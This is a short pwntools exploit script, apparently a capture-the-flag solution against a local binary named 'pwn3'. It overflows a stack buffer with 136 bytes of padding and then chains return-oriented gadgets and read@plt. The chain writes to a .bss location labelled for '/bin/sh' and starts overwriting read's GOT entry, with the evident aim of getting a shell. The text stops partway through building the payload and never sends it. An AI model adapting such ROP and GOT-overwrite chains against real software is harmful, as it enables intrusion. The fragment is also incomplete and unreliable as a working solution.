from pwn import *

p=process("./pwn3")

bss_binsh=0x4040a0
pop_rdi=0x00000000004011bb
pop_rsi_r15=0x00000000004011b9
read_plt=0x0000000000401030
read_got=0x404018
payload=""
payload+="A"*136
payload+=p64(pop_rsi_r15)
payload+=p64(bss_binsh)
payload+=p64(0xdeadbeef)
payload+=p64(read_plt)
payload+=p64(pop_rsi_r15)
payload+=p64(read_got)
payload+=p64(0xdeadbeef)







